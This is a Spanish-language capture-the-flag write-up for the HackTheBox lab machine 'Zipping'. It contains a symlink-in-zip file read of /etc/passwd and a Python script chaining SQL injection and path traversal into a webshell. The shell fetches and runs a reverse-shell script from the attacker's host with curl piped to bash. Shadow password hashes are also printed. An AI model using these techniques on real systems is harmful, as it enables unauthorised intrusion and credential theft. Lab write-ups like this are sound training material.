
# Zipping

<figure><img src="/files/7DeSowEA8W1SUZKMa19R" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Primer acceso</mark>

Accedemos a la IP `10.10.11.229` a través del navegador. A priori parece una tienda de relojes online.

<figure><img src="/files/53KJRydvfHYedNQooCX2" alt=""><figcaption></figcaption></figure>

Encontramos el apartado `/shop`, pero lo más interesantes es la parte de "*Work with Us*" en `/upload.php`, que nos permite subir un archivo:

<figure><img src="/files/ZDwldwJLuZ8bh7K3lzdM" alt=""><figcaption></figcaption></figure>

En principio solo se puede subir un `.zip`:

<figure><img src="/files/UFsbiDNpQMzQuoZaz5O7" alt=""><figcaption></figcaption></figure>

Al probar a subir una webshell comprimida en un zip nos dice que solo puede contener un pdf:

<figure><img src="/files/Gt8ARJJFtGs7rnSqynf5" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escaneo con Nmap</mark>

```bash
sudo nmap -v -sS -sV -sC 10.10.11.229
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.54 (Ubuntu)
|_http-title: Zipping | Watch store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nos encontramos abiertos los puertos 22 y 80. Los típicos.

## <mark style="color:purple;">Fuzzing</mark>

Al fuzzear con dirsearch nos encontramos el directorio `/uploads`, donde se suben los archivos:

<figure><img src="/files/UVjtXPAeAuObwCOoNOdh" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Test de subida de archivos</mark>

Vamos a utilizar simlink para intentar acceder a `/etc/passwd` , crear un archivo pdf, y comprimirlo para la subida:

```bash
ln -s /etc/passwd ./symlink.pdf
zip --symlinks test.zip symlink.pdf
```

Bingo.  `test.zip` se sube correctamente y nos da un link:

<figure><img src="/files/7CaWw48VdaU39zDpjZdP" alt=""><figcaption></figcaption></figure>

Al acceder nos da un código en base64:

<figure><img src="/files/q4aMeULBBsp4EacCqv2A" alt=""><figcaption></figcaption></figure>

{% code title="Response" %}

```
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTAwOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMjpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDM6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXJlc29sdmU6eDoxMDQ6MTEwOnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnBvbGxpbmF0ZTp4OjEwNToxOjovdmFyL2NhY2hlL3BvbGxpbmF0ZTovYmluL2ZhbHNlCnNzaGQ6eDoxMDY6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpyZWt0c3U6eDoxMDAxOjEwMDE6Oi9ob21lL3Jla3RzdTovYmluL2Jhc2gKbXlzcWw6eDoxMDc6MTE1Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpfbGF1cmVsOng6OTk5Ojk5OTo6L3Zhci9sb2cvbGF1cmVsOi9iaW4vZmFsc2UK
```

{% endcode %}

Lo guardamos en un archivo `code` y lo decodificamos usando:

```bash
base64 code -d
```

<figure><img src="/files/E1bZ34XBb0hFMmJYqjJQ" alt=""><figcaption></figcaption></figure>

E Voilá. Tenemos el passwd y nos encontramos el usuario `rektsu` con permisos de ejecución en la shell:

```
rektsu:x:1001:1001::/home/rektsu:/bin/bash
```

Con el mismo procedimiento, cambiamos la ruta a `/home/rektsu/user.txt` y conseguimos el user flag:

<figure><img src="/files/S2D8eHIyqnbuM8mAuTwF" alt=""><figcaption></figcaption></figure>

Al intentar ese procedimiento para acceder a archivos como el `shadow` donde se almacenan todos los hashes de contraseñas o a la carpeta `root`, nos devuelve un error "Not found", no es capaz de acceder, por lo que tendremos que encontrar otra manera:

<figure><img src="/files/unABnoqFLsULjE4dnyCz" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Exploit</mark>

Vamos a crear un exploit en python para conectarnos al host y tener un mayor control. Lo que hace el siguiente script es crear una reverse shell y devolvernos una conexión reversa a nuestro netcat listener:

{% code title="HTB\_Zipping\_poc.py" %}

```python
import requests
import sys
import subprocess
import random

if len(sys.argv) < 2:
    print("Usage: python3 HTB_Zipping_poc.py <listener ip> <listener port>")
    sys.exit(1)

fnb = random.randint(10, 10000)
url = "http://zipping.htb/"

session = requests.Session()

print("[+] Please run nc in other terminal: rlwrap -cAr nc -nvlp " + f"{sys.argv[2]}")

print("[+] Write php shell /var/lib/mysql/rvsl" + str(fnb) + ".php")

with open('revshell.sh', 'w') as f:
        f.write("#!/bin/bash\n")
        f.write(f"bash -i >& /dev/tcp/{sys.argv[1]}/{sys.argv[2]} 0>&1")
proc = subprocess.Popen(["python3", "-m", "http.server", "8000"])
phpshell = session.get(url + f"shop/index.php?page=product&id=%0A'%3bselect+'<%3fphp+system(\"curl+http%3a//{sys.argv[1]}:8000/revshell.sh|bash\")%3b%3f>'+into+outfile+'/var/lib/mysql/rvsl{fnb}.php'+%231")

print("[+] Get Reverse Shell")

phpshell = session.get(url + f"shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2frvsl{fnb}")

proc.terminate()
```

{% endcode %}

Para ejecutarlo seguimos los siguientes pasos:

```bash
echo "10.10.11.229 zipping.htb" >> /etc/hosts
nc -nvlp 4444
python3 HTB_Zipping_poc.py 10.10.14.63 4444
```

<figure><img src="/files/oEUZFnbrLw74XxvmPt9B" alt=""><figcaption></figcaption></figure>

E voilá! Ya estamos dentro, obteniendo una reverse shell. De la misma manera obtenemos de nuevo el user flag:

<figure><img src="/files/j3Bd0hnPCtHBy5mZVBUo" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escalada de Privilegios</mark>

Como es típico en todas las máquinas Linux, vamos a ejecutar un Linpeas para ver que información nos saca:

<figure><img src="/files/YJ1Xf5BFT8fIoxgYZLYO" alt=""><figcaption></figcaption></figure>

Nos encuentra un archivo interesante marcado como crítico en `/tmp/bash`:

<figure><img src="/files/4eJB9qxZVE94UW7RikMF" alt=""><figcaption></figcaption></figure>

Al intentar explotarlo con `/tmp/bash -p` parece que no nos da resultados porque algunos comandos no los ejecuta bien, pero en realidad si hacemos un `cat /root/root.txt` obtenemos el root flag 🏆

<figure><img src="/files/8Ezp1y98Gu8S2KqPVfhX" alt=""><figcaption></figcaption></figure>

Para comprometerlo completamente vamos más allá y si hacemos un `cat /etc/shadow` nos devuelve todos los hashes que podemos crackear:

<figure><img src="/files/TJm5YkInDVngMGpvNgN9" alt=""><figcaption></figcaption></figure>

<pre><code>root:$y$j9T$IYa44JPNfCWV4rqT1W1Kj/$xiHZCNOyiAOLgnHZ06gdF9jWPNR9ixmhsCwFu0Hgy9/:19548:0:99999:7:::
<strong>rektsu:$y$j9T$wWBMg/LAoOoUB448jkabg.$8ivoFrxatQTk89/GmgCMdoByo9a1o.l8GK/Xo8BnwT3:19548:0:99999:7:::
</strong></code></pre>
